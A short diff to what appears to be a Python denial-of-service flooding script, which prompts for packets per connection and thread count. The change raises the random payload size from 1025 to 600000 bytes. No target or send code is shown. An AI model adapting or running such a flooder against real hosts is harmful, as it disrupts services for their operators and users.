@@ -21,7 +21,7 @@ choice = str(input(" Y ORE N(y/n):"))
 times = int(input(" Packets per one connection:"))
 threads = int(input(" Threads:"))
 def run():
-	data = random._urandom(1025)
+	data = random._urandom(600000)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
